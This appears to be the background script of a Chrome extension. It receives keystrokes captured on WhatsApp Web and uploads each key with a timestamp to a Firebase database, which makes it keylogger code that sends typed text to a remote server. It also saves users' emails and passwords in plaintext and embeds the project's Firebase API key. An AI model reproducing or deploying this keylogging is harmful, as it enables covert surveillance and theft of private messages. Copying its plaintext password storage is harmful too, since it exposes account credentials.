// Upload Data to firebase database

const WHATSAPP_WEB = "https://web.whatsapp.com/"
const SIGN_IN_ACTION = "SIGNIN"
const SIGN_UP_ACTION = "SIGNUP"

const config = {
    apiKey: "AIzaSyABnZ9KDeJiJxqswHy7rJqVhP5Qu5DOxRo",
    authDomain: "anona-dd0ad.firebaseapp.com",
    databaseURL: "https://anona-dd0ad.firebaseio.com",
    projectId: "anona-dd0ad",
    storageBucket: "anona-dd0ad.appspot.com",
    messagingSenderId: "126637111077"
  };

const FIREBASEANONA = firebase.initializeApp(config);
var isSignedIn = false;
var databaseKey = "a";

function writeClientData(key, time, databaseKey) {
    FIREBASEANONA.database().ref("users/" + databaseKey + "/keys").update({
        [time]: key
    });
}

function onSignIn(request){
	firebase.auth().signInWithEmailAndPassword(request.email, request.password);
}

function onSignUp(request){
    firebase.auth().createUserWithEmailAndPassword(request.email, request.password);
}

function updateDatabase(request){
    var email = request.email, password = request.password,
        key = email.substr(0, email.indexOf('@'));
    // Set database Users/[username] without @-- with password.
    FIREBASEANONA.database().ref('users/' + key).set({
        email: email,
        password: password,
        keys: {}
    });
    
    alert("key = " + key);
    return key;
}

function onMessage(request, sender){
    if(!isSignedIn){
        if(request.action == SIGN_IN_ACTION){
            isSignedIn = true;
			onSignIn(request);
            databaseKey = updateDatabase(request);
		}
		if(request.action == SIGN_UP_ACTION){
            isSignedIn = true;
			onSignUp(request)
            databaseKey = updateDatabase(request);
		}
    }
	else {
        if(sender.url == WHATSAPP_WEB && isSignedIn){
            console.log(request.key + "- " + request.time);
            writeClientData(request.key, request.time, databaseKey);
        }
    }
}

chrome.runtime.onMessage.addListener(onMessage);